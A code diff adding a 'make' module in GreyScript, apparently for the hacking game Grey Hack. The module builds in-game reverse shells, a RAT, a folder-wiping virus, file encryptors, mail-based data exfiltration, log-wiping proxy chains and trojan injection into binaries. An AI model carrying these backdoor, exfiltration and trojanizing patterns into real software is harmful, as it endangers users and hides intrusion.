@@ -1,0 +1,712 @@
+// =============================================================================
+// MAKE
+// Build custom binaries: rshell, RAT, virus, proxy chains, and system commands.
+// =============================================================================
+Command.make=function(Obj,argv)
+  if not argv then return Man.help(["make"])
+  mode=lower(argv[0])
+  // Load source code from payload files
+  _loadSrc=function(dir)
+    m={}
+    if not dir then return m
+    for f in get_files(dir);m[name(f)]=get_content(f);end for
+    return m
+  end function
+  _sys=System.getSystem
+  bins=_loadSrc(_sys.dir.srcBin)
+  tools=_loadSrc(_sys.dir.srcTools)
+  // State variables for process hiding feature (ps/htop)
+  hideProcess=null
+  processName=""
+  // Hidden process code templates
+  hideTemplates={
+    "ps":"if len(params)>0 then exit(command_info(""ps_usage""));d=[""USER PID CPU MEM COMMAND""];for l in split(show_procs(host_computer(get_shell)),char(10))[1:];l=split(l,"" "");if l[4]==""{process}"" then continue;push(d,join(l,"" ""));end for;print(format_columns(join(d,char(10))))",
+    "htop":"string.red=function;return ""<color=#ff4b4b>""+self+""</color>"";end function;string.liteGrey=function;return ""<color=#fbfbfb>""+self+""</color>"";end function;string.lime=function;return ""<color=#baff50>""+self+""</color>"";end function;string.grey=function;return ""<color=#9d9d9d>""+self+""</color>"";end function;string.black=function;return ""<color=#032e41>""+self+""</color>"";end function;string.blue=function;return ""<color=#36abe8>""+self+""</color>"";end function;string.green=function;return ""<color=#20ff98>""+self+""</color>"";end function;k="""";c=host_computer(get_shell);while 1;_a=function(n,l=29);f=ceil(n/l*10);e=l-f;a=""#""*f;b=""-""*e;return (a.blue+b.black);end function;z={};d=0.0;m=0.0;i=0;for l in split(show_procs(c),char(10))[1:];l=split(l,"" "");if l[4]==""{process}"" then continue;u=l[0];if u==""root"" then u=u.red else u=u.liteGrey;t={""user"":u,""pid"":str(l[1]).green,""cpu"":str(l[2]).blue,""mem"":str(l[3]).blue,""command"":l[4].lime};d=d+val(l[2][:-1]);m=m+val(l[3][:-1]);z[i]=t;i=i+1;end for;h=[];push(h,(""    tasks: ""+len(z)).liteGrey);push(h,(""cpu_usage: [""+_a(d)+""]==[""+(d+""%"").blue+""]"").liteGrey);if m>100 then push(h,(""mem_usage: [""+(""#""*29).blue+""]==[""+(""100%"").blue+""]"").liteGrey) else push(h,(""mem_usage: [""+_a(m)+""]==[""+(m+""%"").blue+""]"").liteGrey);p=[];push(p,join([""USER"".grey,""PID"".grey,""CPU"".grey,""MEM"".grey,""COMMAND"".grey],""  ""));for t in z;v=t.value;push(p,join([v.user,v.pid,v.cpu,v.mem,v.command],""  ""));end for;x=join(h,char(10));y=join(p,char(10));if k!=x+y then;print(x,1);print(format_columns(y),1);k=x+y;end if;end while"
+  }
+  // Virus payload templates
+  virusTemplates={
+    "v":"z=get_folders(File(host_computer(get_shell),""/""));for i in z;delete(i);end for;"
+  }
+  // Encryption/decryption templates
+  cryptTemplates={
+    "b":"f=File(host_computer(get_shell),""/"");c=[];d=get_folders(f)+get_files(f);while len(d);f=pull(d);if is_folder(f) then d=d+get_folders(f)+get_files(f);push(c,f);end while;for f in c;if not has_permission(f,""r"") then continue;if not has_permission(f,""w"") then continue;r=[];b=split(get_content(f),char(10));for w in b;push(r,(_e(w,k)+char(10));end for;set_content(f,trim(join(r,"""")));end for;",
+    "e":"_e=function(s=null,k=null);if not k or not k isa string then return;if not s or not s isa string then return;z=len(k);r="""";c=0;for i in s;y=k[c];f=(i.code+y.code)%55295;r=r+char(f);c=(c+1)%z;end for;return r;end function;",
+    "d":"_e=function(s=null,k=null);if not k or not k isa string then return;if not s or not s isa string then return;z=len(k);r="""";c=0;for i in s;y=k[c];f=(i.code-y.code);if f<0 then f=0-f;r=r+char(f);c=(c+1)%z;end for;return r;end function;"
+  }
+  getCustomCode=function(binaryName)
+    Info.info("Enter the code you would like to add to "+binaryName)
+    code=""
+    while true;line=Gui.input({"text":"Enter custom code"});if line==null then break else code+=line+";";end while
+    return code
+  end function
+  getCustomFile=function
+    fileObj=Io.file(Obj,Obj.user.home,"Select a custom code file:")
+    if fileObj isa Warning then return fileObj
+    code=""
+    for line in split(get_content(fileObj),char(10));if not line then continue;code+=line+";";end for
+    return code
+  end function
+  genRshell=function(binaryName)
+    if binaryName=="htop" or binaryName=="ps" then
+      if Gui.yesNo("Do we need to hide the proccess?") then outer.hideProcess=1
+    end if
+    procName=Gui.input({"text":"What would you like the process name to be?","default":"ps"})
+    port=1222
+    if outer.hideProcess then outer.processName=procName
+    rshellIP=System.rshell
+    if not rshellIP then
+      rshellIP=Gui.input({"text":"What ip would you like to use?","default":Obj.meta.public_ip})
+      port=Gui.inputInt({"text":"What port are we using?","default":1222})
+      if not port isa number then return Error.set("You must enter a port")
+    end if
+    return ("standalone=function;p=File(host_computer(get_shell),""/"");d=get_folders(p)+get_files(p);while len(d);f=pull(d);if is_folder(f) then d=d+get_folders(f)+get_files(f);if name(f)==""metaxploit.so"" or name(f)=="".metaxploit.so"" then;l=include_lib(path(f));if l and typeof(l)==""MetaxploitLib"" then return l;end if;end while;end function;if split(show_procs(host_computer(get_shell)),"""+procName+""").len==1 then;m=standalone;if m then rshell_client(m,"""+rshellIP+""","+port+","""+procName+""");end if;")
+  end function
+  binPassword=function(binaryName,isExecute=0)
+    password=0
+    if not isExecute then password=Gui.inputPass("Enter a password for the new binaries") else password=Gui.inputPass("Enter a password to execute [ "+binaryName+" ]")
+    if not password then return Error.set("You must enter a password")
+    return "if not user_input(""Enter password: "",1)=="""+password+""" then exit(""Invalid password"");"
+  end function
+  genGco=function
+    email=null
+    pass=null
+    credsFile=File(Obj.computer,path(Obj.dir.data)+"/.erc")
+    if credsFile then
+      decrypted=Encryption.encrypt(get_content(credsFile),Kernel.key,false)
+      parts=split(decrypted,"::")
+      if len(parts)==2 then
+        email=parts[0]
+        pass=parts[1]
+        if not Gui.yesNo("Use saved email [ "+email+" ]?") then
+          email=null
+          pass=null
+        end if
+      end if
+    end if
+    if email==null then
+      email=Gui.input({"text":"Enter your email address"})
+      if email==null then return Error.set("Email required")
+      pass=Gui.inputPass("Enter your email password")
+      if not pass then return Error.set("Password required")
+    end if
+    capStr=Gui.input({"text":"List cap (max items for passwords/hashes)","default":"50"})
+    cap=50
+    if capStr then cap=to_int(capStr)
+    if not cap then cap=50
+    return "_gco=function;co=get_custom_object;lines=[];cap="+cap+";for item in co;if item.key==""__isa"" or item.key==""classID"" then continue;push(lines,""[""+item.key+""]"");if @item.value isa funcRef then;push(lines,""=<func>"");else if item.value isa string or item.value isa number or item.value==null then;push(lines,""=""+str(item.value));else if item.value isa map then;for sub in item.value;if sub.key==""__isa"" or sub.key==""classID"" then continue;if @sub.value isa funcRef then;push(lines,"".""+sub.key+""=<func>"");continue;end if;sv=sub.value;if sv isa string or sv isa number then;push(lines,"".""+sub.key+""=""+str(sv));else if sv isa map then;for sub2 in sv;if sub2.key==""__isa"" or sub2.key==""classID"" then continue;if @sub2.value isa funcRef then;push(lines,"".""+sub.key+"".""+sub2.key+""=<func>"");continue;end if;sv2=sub2.value;if sv2 isa string or sv2 isa number then;push(lines,"".""+sub.key+"".""+sub2.key+""=""+str(sv2));end if;end for;end if;end for;else if item.value isa list then;cnt=0;for lv in item.value;if lv isa map then;push(lines,""[""+cnt+""]"");for lsub in lv;if lsub.key==""__isa"" or lsub.key==""classID"" then continue;if lsub.value isa string or lsub.value isa number then;push(lines,"".""+lsub.key+""=""+str(lsub.value));end if;end for;else;if cnt>=cap then;push(lines,""...(truncated)"");break;end if;push(lines,""[""+cnt+""]=""+str(lv));end if;cnt=cnt+1;end for;end if;end for;if not lines then return;push(lines,""[END]"");m=mail_login("""+email+""","""+pass+""");if typeof(m)!=""MetaMail"" then return;chunk="""";n=0;for ln in lines;if len(chunk)+len(ln)+1>2450 then;n=n+1;m.send("""+email+""",""GCO ""+n,chunk);wait(2);chunk="""";end if;chunk=chunk+ln+char(10);end for;if chunk then;n=n+1;m.send("""+email+""",""GCO ""+n,chunk);end if;end function;_gco;"
+  end function
+  encryptKey=function;key=Gui.inputPass("Enter a seed/key:");if not key then key="Tux";return (cryptTemplates.e+"k="""+key+""""+";"+cryptTemplates.b);end function
+  decryptKey=function;key=Gui.inputPass("Enter a seed/key:");if not key then key="Tux";return (cryptTemplates.d+"k="""+key+""""+";"+cryptTemplates.b);end function
+  genRat=function
+    ratIP=Gui.inputIP({"text":"Rat server ip"})
+    if ratIP==null then return Error.set("Missing rat server ip")
+    ratPort=Gui.inputInt({"text":"Rat server port","default":22})
+    if not ratPort isa number then return Error.set("Missing rat server port")
+    ratPassword=Gui.inputPassNS("Root password")
+    testShell=connect_service(Obj.shell,ratIP,ratPort,"root",ratPassword)
+    if typeof(testShell)!="shell" then return Warning.set("Unable to connect to your rat server")
+    Info.info("Server connection verified")
+    return "rat=function(i,p,u,w);c=host_computer(get_shell);s=connect_service(get_shell,i,p,u,w);if s isa string then return;f=File(host_computer(s),""/root/rat"");if not f then return;q=get_content(f);if len(q)==0 then return;h=home_dir+""/Config"";touch(c,h,"".r.src"");z=File(c,h+""/.r.src"");if not z then return;set_content(z,q);if build(get_shell,path(z),h)=="""" then launch(get_shell,h+""/.r"");set_content(z,"""");end function;rat("""+ratIP+""","+ratPort+",""root"","""+ratPassword+""");"
+  end function
+  buildable=function(args)
+    _fmt=function(items,cols=5,w=13)
+      row=[]
+      output=[]
+      _len=len(items)
+      for item in items
+        push(row,ljust(item,w))
+        if len(row)==cols then
+          if __item_idx==_len-1 then push(output,join(row,"")) else push(output,join(row,"")+char(10))
+          row=[]
+          continue
+        end if
+      end for
+      if row then push(output,join(row,""))
+      return join(output,"")
+    end function
+    _bar=yellow("<[==========================================================]>")
+    cmds=[]
+    cmdsWide=[]
+    servers=[]
+    for item in bins
+      if item.key.indexOf("-server")!=null then
+        push(servers,item.key)
+      else if len(item.key)>12 then
+        push(cmdsWide,item.key)
+      else
+        push(cmds,item.key)
+      end if
+    end for
+    cmds.sort
+    cmdsWide.sort
+    servers.sort
+    Info.info("X can build any of the following commands:")
+    print _bar
+    print _fmt(cmds)
+    if cmdsWide then print char(10)+_fmt(cmdsWide,3,19)
+    print _bar
+    if servers then
+      Info.info("X can build the following servers:")
+      print _bar
+      print _fmt(servers,3,19)
+      print _bar
+    end if
+    toolList=[]
+    for item in tools;push(toolList,item.key);end for
+    toolList.sort
+    Info.info("X can build the following tools:")
+    print _bar
+    print _fmt(toolList)
+    print _bar
+  end function
+  viewSource=function(args);if not args then return Error.set("No source name supplied");binaryName=lower(args[0]);if not binaryName or not hasIndex(bins,binaryName) then return Error.set("There is not binary source to show with the name [ "+binaryName+" ]");listNH(split(bins[binaryName],";"));end function
+  rshell=function(arg)
+		x=genRshell
+		j=Gui.input({"text":"What would you like the file name to be?","default":"file"})
+		d=path(Obj.dir.current)
+		c=Obj.computer
+		n=Command.touch(Obj,[d+"/"+j+".src"])
+		if n isa Error then return
+		set_content(n,x)
+		t=build(Obj.shell,path(n),d)
+    Command.qrm(Obj,[n])
+		if t!="" then return Error.set(t)
+		q=File(c,d+"/"+j)
+		if not q then return Error.set("There was an error building "+j)
+		if has_permission(File(c,"/bin"),"w") then
+			if Gui.yesNo("Would you like to place "+white(j)+" into [ /bin ]?") then
+				if move(q,"/bin",name(q))!=1 then
+          if Command.qrm(Obj,"/bin/"+name(q)) isa Error then return
+          move(q,"/bin",name(q))
+        end if
+				return Info.info(j+" has been successfully built and placed in [ /bin ]")
+			else
+				return Info.info(j+" has been successfully built and placed in [ "+d+" ]")
+			end if
+		end if
+  end function
+  defaultBins=function(arg)
+    _p=ArgumentParser.init
+    _p.addArgument("y",false,"flag")  // Auto-confirm /bin placement
+    arg=_p.parseArgs("make",arg)
+    d=null
+    c=Obj.computer
+    if arg.y then
+      d=File(c,"/bin")
+    else
+      if has_permission(File(c,"/bin"),"w") then
+        if Gui.yesNo("Would you like to place the compiled bin's into [ /bin ]?") then
+          d=File(c,"/bin")
+        else
+          d=Io.folder(Obj,Obj.user.home,"Select a directory:")
+          if d isa Warning then return d
+        end if
+      else
+        create_folder(c,path(Obj.dir.current),"BINS")
+        d=File(c,path(Obj.dir.current)+"/BINS")
+        if not d then return Error.set(Info.message.EXPF+"NULL")
+      end if
+    end if
+		for z in bins
+      b=z.key
+      f=File(c,path(d)+"/"+b)
+      if f then Command.qrm(Obj,[path(f)])
+      s=bins[b]
+      n=Command.touch(Obj,[path(d)+"/"+b+".src"])
+      if n isa Error then return
+			set_content(n,s)
+			t=build(Obj.shell,path(d)+"/"+b+".src",path(d))
+      Command.qrm(Obj,[n])
+			if t!="" then return Error.set(t)
+		end for
+    Info.info("All files that could be build are in :"+path(d))
+  end function
+  doBuild=function(arg)
+    if not arg then return Error.set("No build name supplied")
+    installPath=null
+    if len(arg)>=2 and arg[-1][0]=="/" then
+      installPath=arg[-1]
+      arg=arg[:-1]
+    end if
+		Z=lower(arg[-1])
+    if not Z or not hasIndex(bins,Z) then return Warning.set("Stop cannot make [ "+Z+" ]")
+		arg=join(arg[:1],"")
+    args={"showCode":null,"virus":null,"rshell":null,"rat":null,"password":null,"encrypt":null,"decrypt":null,"customCode":null,"fileInclude":null,"gco":null}
+		// Parse S flag: show source code before building
+		if indexOf(arg,"S")!=null then args.showCode=true
+		// Parse V flag: add virus payload (destructive)
+		if indexOf(arg,"V")!=null then args.virus=true
+		// Parse R flag: add rshell backdoor (check conflicts)
+		if indexOf(arg,"R")!=null then
+      if args.virus then return Warning.set("You can not use both R and V switches together")
+      args.rshell=true
+    end if
+    if indexOf(arg,"T")!=null then
+      if args.virus then return Warning.set("You can not use both T and V switches together")
+      if args.rshell then return Warning.set("You can not use both T and R switches together")
+      args.rat=true
+    end if
+		if indexOf(arg,"P")!=null then
+      if args.virus then return Error.set("You can not use both P and V switches together")
+      if args.rshell then return Error.set("You can not use both P and R switches together")
+      args.password=true
+    end if
+		if indexOf(arg,"E")!=null then
+      if args.virus then return Error.set("You can not use both E and V switches together")
+      if args.rshell then return Error.set("You can not use both E and R switches together")
+      args.encrypt=true
+    end if
+		if indexOf(arg,"D")!=null then
+      if args.virus then return Error.set("You can not use both D and V switches together")
+      if args.rshell then return Error.set("You can not use both D and R switches together")
+      args.decrypt=true
+    end if
+    if args.encrypt and args.decrypt then return Error.set("You can not use both E and D switches together")
+    if indexOf(arg,"G")!=null then
+      if args.virus then return Warning.set("You can not use both G and V switches together")
+      if args.rshell then return Warning.set("You can not use both G and R switches together")
+      if args.rat then return Warning.set("You can not use both G and T switches together")
+      args.gco=true
+    end if
+    if indexOf(arg,"C")!=null then args.customCode=true
+    if indexOf(arg,"F")!=null then args.fileInclude=true
+		s=""
+		if args.password then
+			rt=binPassword(Z)
+			if rt isa Error then return
+			s+=rt
+		end if
+    if args.gco then
+      g=genGco
+      if g isa Error then return g
+    end if
+		if args.virus then s+=outer.virus.v
+		if args.rshell then
+			g=genRshell(Z)
+			if g then s+=g else return
+		end if
+    if args.rat then
+      g=genRat
+      if g then s+=g else return
+    end if
+		if args.encrypt then s+=encryptKey
+		if args.decrypt then s+=decryptKey
+    if args.customCode then s=getCustomCode(Z)
+    if args.fileInclude then
+      f=Io.file(Obj,Obj.user.home,"Select file to include:")
+      if not f isa Warning then
+        r=split(get_content(f),char(10))
+        s=join(r,";")+";"
+      end if
+    end if
+    if outer.hideProcess then
+      s+=outer.hideTemplates[Z]
+      s=s.replace("{process}",outer.processName)
+    else
+      s+=bins[Z]
+    end if
+    if args.gco then s+=";"+g
+		if args.showCode then
+      _src=s.replace(";",char(10))
+      print parseSyntax(_src,true)
+      user_input(yellow("Press Enter when ready"))
+    end if
+		d=path(Obj.dir.current)
+		c=Obj.computer
+		n=Command.touch(Obj,[d+"/"+Z+".src"])
+    if n isa Error then return
+		set_content(n,s)
+		t=build(Obj.shell,path(n),d)
+    Command.qrm(Obj,[n])
+		if t!="" then return Error.set(t)
+		q=File(c,d+"/"+Z)
+		if not q then return Error.set("There was an error building "+Z)
+    if installPath then
+      destDir=File(c,installPath)
+      if not destDir then return Error.set("Install path not found: "+installPath)
+      if not has_permission(destDir,"w") then return Error.set("No write permission for: "+installPath)
+      move(q,installPath,name(q))
+      Info.info(Z+" installed to [ "+installPath+" ]")
+    else if has_permission(File(c,"/bin"),"w") then
+			if Gui.yesNo("Would you like to place "+white(Z)+" into [ /bin ]?") then
+				move(q,"/bin",name(q))
+				Info.info(Z+" has been successfully built and placed in [ /bin ]")
+			else
+        Info.info(Z+" has been successfully built and placed in [ "+d+" ]")
+			end if
+    else
+      Info.info(Z+" has been successfully built and placed in [ "+d+" ]")
+		end if
+  end function
+  proxyMap=function(arg)
+    if not Obj.id==0 then return Warning.set("You can only use from main")
+		m=Proxy.getMapConf(Obj).accounts.values
+		if not m then return Info.info("No systems in Map.conf. Run [ get -m (count) ] to add systems to Map.conf")
+		if Gui.yesNo("Would you like to set an end point?",false) then
+			if Gui.yesNo("Select an end point from the root cache?") then
+				Cache.view
+				if not len(globals.G_cachePasswords) then
+					Info.response("Answer the following questions to set an end point:")
+					i=Gui.inputIP({"text":"End point ip"})
+          if i==null then return Info.info("User Aborted","i",false)
+					u=Gui.input({"text":"End point user"})
+          if u==null then return Info.info("User Aborted","i",false)
+					k=Gui.inputPass("End point password")
+          if not k then return Info.info("User Aborted","i",false)
+          push(m,{"user":u,"ip":i,"password":k})
+				else
+					r=Gui.inputInt({"text":"Select a host to set as an end point"})
+					if not r isa number then
+						k=Cache.select(r)
+            push(m,{"user":"root","ip":k.public_ip,"password":k.password})
+					end if
+				end if
+			else
+				Info.response("Answer the following questions to set an end point:")
+				i=Gui.inputIP({"text":"End point ip"})
+        if i==null then return Info.info("User Aborted","i",false)
+				u=Gui.input({"text":"End point user"})
+        if u==null then return Info.info("User Aborted","i",false)
+				k=Gui.inputPass("End point password")
+				if not k or not len(k) then return
+        push(m,{"user":u,"ip":i,"password":k})
+			end if
+		end if
+		w=Gui.inputPass("Enter a password for the proxy chain binary (optional)")
+		p=Gui.input({"text":"Enter a name for the proxy chain binary","default":"proxy"})
+		c=1
+		n=0
+    l=len(m)
+    s=[]
+    push(s,"proxy=function;")
+    push(s,"wipeLog=function(s);c=host_computer(s);f=File(c,""/var/system.log"");if not f then return;if size(f)==""0"" then return;if touch(c,""/var"",""t"") isa number then move(File(c,""/var/t""),""/var"",""system.log"");end function;")
+		for i in m
+      if not len(i)==3 then continue
+			if c==1 then
+				push(s,"a1=connect_service(get_shell,"""+i.ip+""","+22+","""+i.user+""","""+i.password+""");")
+				n=1
+				c=2
+				continue
+			end if
+			push(s,"a"+c+"=connect_service(a"+n+","""+i.ip+""","+22+","""+i.user+""","""+i.password+""");wipeLog(a"+n+");")
+			n=c
+			c+=1
+		end for
+		if w then push(s,"wipeLog(a"+l+");clear_screen;start_terminal(a"+l+");end function;if user_input(""Enter App ID > "",1)=="""+w+"""then;proxy;else;exit(""Bad App ID, keep on knocking but you can't come in :-)"");end if") else push(s,"wipeLog(a"+l+");clear_screen;start_terminal(a"+l+");end function;proxy")
+		f=Command.touch(Obj,[path(Obj.user.home)+"/"+p+".src"])
+		if f isa Error then return
+		set_content(f,join(s,""))
+		x=build(Obj.shell,path(f),path(Obj.user.home))
+		if x=="" then
+			Info.info("Complete [ "+p+" ] is in your home directory...stay safe and happy hacking")
+			if f then Command.qrm(Obj,[f])
+		else
+			Error.set(x)
+		end if
+  end function
+  proxyPDat=function(arg)
+    if not Obj.id==0 then return Warning.set("You can only use from main")
+		f=File(Obj.computer,path(Obj.dir.data)+"/proxy.dat")
+		if not f then return Error.set("No proxy chain file found")
+		l=split(get_content(f),char(10))
+		if not len(l) then return Error.set("No proxy chain file found")
+		z=[]
+		for p in l;j=split(Encryption.encrypt(p,Kernel.key,false),":");if not len(j)==4 then continue;push(z,{"ip":j[0],"port":to_int(j[1]),"user":j[2],"password":j[3]});end for
+		w=Gui.inputPass("Enter a password for the proxy chain binary (optional)")
+		p=Gui.input({"text":"Enter a name for the proxy chain binary","default":"proxy"})
+		c=1
+		n=0
+    s=[]
+		push(s,"proxy=function;")
+		push(s,"wipeLog=function(s);c=host_computer(s);f=File(c,""/var/system.log"");if not f then return;if size(f)==""0"" then return;if touch(c,""/var"",""t"") isa number then move(File(c,""/var/t""),""/var"",""system.log"");end function;")
+		for i in z
+			if c==1 then
+				push(s,"a1=connect_service(get_shell,"""+i.ip+""","+i.port+","""+i.user+""","""+i.password+""");")
+				n=1
+				c=2
+				continue
+			end if
+			push(s,"a"+c+"=connect_service(a"+n+","""+i.ip+""","+i.port+","""+i.user+""","""+i.password+""");wipeLog(a"+n+");")
+			n=c
+			c+=1
+		end for
+		if w then push(s,"wipeLog(a"+len(z)+");clear_screen;start_terminal(a"+(len(z))+");end function;if user_input(""Enter App ID > "",1)=="""+w+"""then;proxy;else;exit(""Bad App ID, keep on knocking but you can't come in :-)"");end if") else push(s,"wipeLog(a"+len(z)+");clear_screen;start_terminal(a"+(len(z))+");end function;proxy")
+		f=Command.touch(Obj,[path(Obj.user.home)+"/"+p+".src"])
+    if f isa Error then return
+		set_content(f,join(s,""))
+		x=build(Obj.shell,path(f),path(Obj.user.home))
+		if x=="" then
+			Info.info("Complete [ "+p+" ] is in your home directory...stay safe and happy hacking")
+			if f then Command.qrm(Obj,[f])
+		else
+			Error.set(x)
+		end if
+  end function
+  manualProxy=function(arg)
+    if not Obj.id==0 then return Warning.set("You can only use from main")
+		v=Gui.inputInt({"text":"How many server(s) will we be using?"})
+		if not v isa number then return Error.set("Server Count unacceptable!")
+		w=Gui.inputPass("Enter a password for the proxy chain binary (optional)")
+		p=Gui.input({"text":"Enter a name for the proxy chain binary","default":"proxy"})
+		s=[]
+		push(s,"proxy=function;")
+		push(s,"wipeLog=function(s);c=host_computer(s);f=File(c,""/var/system.log"");if not f then return;if size(f)==""0"" then return;if touch(c,""/var"",""t"") isa number then move(File(c,""/var/t""),""/var"",""system.log"");end function;")
+		n=null
+		i=1;while i<=v
+			print green("[ "+i+" ]")
+			j=Gui.inputIP({"text":"Enter IP"})
+      if j==null then return Info.info("User Aborted","i",false)
+			t=Gui.inputInt({"text":"Enter Port"})
+      if not t isa number then return Info.info("User Aborted","i",false)
+			u=Gui.input({"text":"Enter User"})
+      if u==null then return Info.info("User Aborted","i",false)
+			y=Gui.inputPass("Enter User Password")
+      if not y then return Info.info("User Aborted","i",false)
+			if i==1 then
+				push(s,"a1=connect_service(get_shell,"""+j+""","+t+","""+u+""","""+y+""");")
+				n=i
+				i=i+1;continue
+			end if
+			push(s,"a"+(i)+"=connect_service(a"+n+","""+j+""","+t+","""+u+""","""+y+""");wipeLog(a"+n+");")
+			n=i
+			i=i+1
+		end while
+		if w then push(s,"wipeLog(a"+v+");start_terminal(a"+(v)+");end function;if user_input(""Enter App ID > "",1)=="""+w+"""then;proxy;else;exit(""Bad App ID, keep on knocking but you can't come in :-)"");end if") else push(s,"wipeLog(a"+v+");start_terminal(a"+(v)+");end function;proxy")
+		f=Command.touch(Obj,[path(Obj.user.home)+"/"+p+".src"])
+		if f isa Error then return
+		set_content(f,join(s,""))
+		x=build(Obj.shell,path(f),path(Obj.user.home))
+		if x=="" then
+			Info.info("Complete [ "+p+" ] is in your home directory...stay safe and happy hacking")
+			if f then Command.qrm(Obj,[f])
+		else
+			Error.set(x)
+		end if
+  end function
+  serverFront=function(arg)
+    if not Obj.id==0 then return Warning.set("You can only use from main")
+		w=Gui.inputPass("Enter a password for this custom server (optional)")
+		p=Gui.input({"text":"Enter a name for this custom server binary","default":"myserver"})
+		j=Gui.inputIP({"text":"Enter IP"})
+    if j==null then return Info.info("User Aborted","i",false)
+		t=Gui.inputInt({"text":"Enter Port"})
+    if not t isa number then return Info.info("User Aborted","i",false)
+		u=Gui.input({"text":"Enter User"})
+    if u==null then return Info.info("User Aborted","i",false)
+		y=Gui.inputPass("Enter User Password")
+    if not y then return Info.info("User Aborted","i",false)
+    s=Gui.input({"text":"Enter Service Type","default":"ssh"})
+    _=["proxy=function;"]
+    push(_,"a=connect_service(get_shell,"""+j+""","+t+","""+u+""","""+y+""","""+s+""");")
+		if w then push(_,"start_terminal(a);end function;if user_input(""Enter App ID > "",1)=="""+w+"""then;proxy;else;exit(""Bad App ID, keep on knocking but you can't come in :-)"");end if") else push(_,"start_terminal(a);end function;proxy")
+		f=Command.touch(Obj,[path(Obj.user.home)+"/"+p+".src"])
+		if f isa Error then return
+		set_content(f,join(_,""))
+		x=build(Obj.shell,path(f),path(Obj.user.home))
+		if x=="" then
+			Info.info("Complete [ "+p+" ] is in your home directory")
+			if f then Command.qrm(Obj,[f])
+		else
+			Error.set(x)
+		end if
+  end function
+  buildRecovery=function(arg)
+		d=path(Obj.dir.current)
+		n=Command.touch(Obj,[d+"/rec.src"])
+		if n isa Error then return
+		set_content(n,Recover.source)
+		t=build(Obj.shell,path(n),d)
+    Command.qrm(Obj,[n])
+		if t!="" then return Error.set(t)
+		Info.info("Recover binary is in [ "+d+" ]")
+  end function
+  inject=function(arg)
+    if len(arg)<2 then return Error.set("Invalid inject arguments")
+    runInject=function(Obj)
+      a=[
+        "/bin",
+        "/home/guest/Config",
+        "/home/guest/Downloads",
+        "/home/guest",
+        path(Obj.user.home)+"/Config",
+        path(Obj.user.home)+"/Downloads",
+        path(Obj.user.home)
+      ]
+      for p in a
+        p=Io.getFileObj(Obj,p)
+        if not p isa Error then
+          r=create_folder(Obj.computer,path(p),".h")
+          if r isa string then continue
+          f=Io.getFileObj(Obj,path(p)+"/.h")
+					if f isa Error then continue
+          return f
+        end if
+      end for
+    end function
+    A=arg[0]
+    Z=arg[1]
+    if not A then f=Io.file(Obj,Obj.user.home,"Select a binary file to inject:") else f=Io._getFile(Obj,A)
+    if f isa Error or f isa Warning then return f
+    if not is_binary(f) then return Error.set(name(f)+" is not a binary file")
+    if not Z then return Error.set("Invalid arguments")
+    if Z=="R" then
+			g=genRshell("xxxx")
+			if g then Z=g else return
+    else if Z=="T" then
+      g=genRat
+      if g then Z=g else return
+    else if Z=="V" then
+      Z=outer.virusTemplates.v
+    else if Z=="C" then
+      Info.info("Enter the source code that you would like to inject into "+name(f))
+      Z=""
+      while true;j=Gui.input({"text":"Enter nothing to stop"});if j==null then break else Z+=j+";";end while
+    else
+      return Error.set("Invalid arguments")
+    end if
+    T=runInject(Obj)
+		if T isa Error then return Info.error("Failed to inject "+name(f))
+    p=path(f)
+    o=path(parent(f))
+    n=name(f)
+    s=n+".src"
+    r=move(f,path(T),name(f))
+    if r isa string then return Error.set(r)
+    z=Command.touch(Obj,[o+"/"+s])
+    if z isa Error then return
+    f=Io.getFileObj(Obj,path(T)+"/"+n)
+		if f isa Error then return
+    Z+="if len(params)>0 then launch(get_shell,"""+path(f)+""",join(params,"" "")) else launch(get_shell,"""+path(f)+""")"
+    r=set_content(z,Z)
+    if r isa string then return Error.set(r)
+    r=build(Obj.shell,path(z),o)
+    Command.qrm(Obj,[z])
+    if r!="" then return Error.set(r) else Info.info("Finished ;)")
+  end function
+  standalone=function(arg)
+    getCustomCode=@getCustomCode
+    getCustomFile=@getCustomFile
+    if not arg then return Error.set("No tool name supplied")
+    arg=ArgumentParser.check(arg)
+    _p=ArgumentParser.init
+    _p.addArgument("y",false,"flag")  // Auto-confirm /bin placement
+    _p.addArgument("f",false,"flag")  // Load custom code from file
+    _p.addArgument("c",false,"flag")  // Prepend custom code to built binary
+    _p.addArgument("b",false,"flag")  // Append base tool source to custom code
+    _p.addArgument("e",false,"flag")  // Use default encryption mode in binary
+    _p.addArgument("p",false,"store")  // Packer/encryption password
+    _p.addArgument("s",false,"store")  // Build start path
+    _p.addArgument("o",false,"store")  // Output/install path
+    arg=_p.parseArgs("make",arg)
+    if arg isa Error then return
+    if not arg.rest then return Error.set("No tool name supplied")
+    if not arg.p then arg.p=Kernel.zip
+    if not arg.s then arg.s="/"
+    Arg1=arg.rest[0]
+    if not hasIndex(tools,Arg1) then return Error.set("Check your syntax, there is no tool named [ "+Arg1+" ]")
+    Obj=outer.Obj
+    tools=outer.tools
+    // Map source keys to display names (only where they differ)
+    displayNames={"wbounce":"wifibounce","lfbounce":"lanfilebounce","lbounce":"lanbounce","sniffer":"sniffer"}
+    buildTool=function(sourceKey)
+      dName=sourceKey
+      if hasIndex(displayNames,sourceKey) then dName=displayNames[sourceKey]
+      if arg.c then
+        if arg.f then S=getCustomFile else S=getCustomCode(dName)
+        if not S isa string then return
+        if arg.b then runBuild(S+tools[sourceKey],dName) else runBuild(tools[sourceKey]+S,dName)
+      else
+        runBuild(tools[sourceKey],dName)
+      end if
+    end function
+    runBuild=function(s,z)
+      d=path(Obj.dir.current)
+      c=Obj.computer
+      n=Command.touch(Obj,[d+"/"+z+".src"])
+      if n isa Error then return
+      set_content(n,s)
+      t=build(Obj.shell,path(n),d)
+      Command.qrm(Obj,[n])
+      if t!="" then return Error.set(t)
+      q=File(c,d+"/"+z)
+      if not q then return Error.set("There was an error building "+z)
+      if arg.o then
+        destDir=File(c,arg.o)
+        if not destDir then return Error.set("Install path not found: "+arg.o)
+        if not has_permission(destDir,"w") then return Error.set("No write permission for: "+arg.o)
+        move(q,arg.o,name(q))
+        Info.info(z+" installed to [ "+arg.o+" ]")
+      else if not arg.y then
+        if has_permission(File(c,"/bin"),"w") then
+          if Gui.yesNo("Would you like to place "+white(z)+" into [ /bin ]?") then
+            move(q,"/bin",name(q))
+            Info.info(z+" has been successfully built and placed in [ /bin ]")
+          else
+            Info.info(z+" has been successfully built and placed in [ "+d+" ]")
+          end if
+        end if
+      else
+        Info.info(z+" has been successfully built and placed in [ "+d+" ]")
+      end if
+    end function
+    lock=function;runBuild("p="""+arg.p+""";c=host_computer(get_shell);t=File(c,"""+arg.s+""")"+tools["lock"],"lock");end function
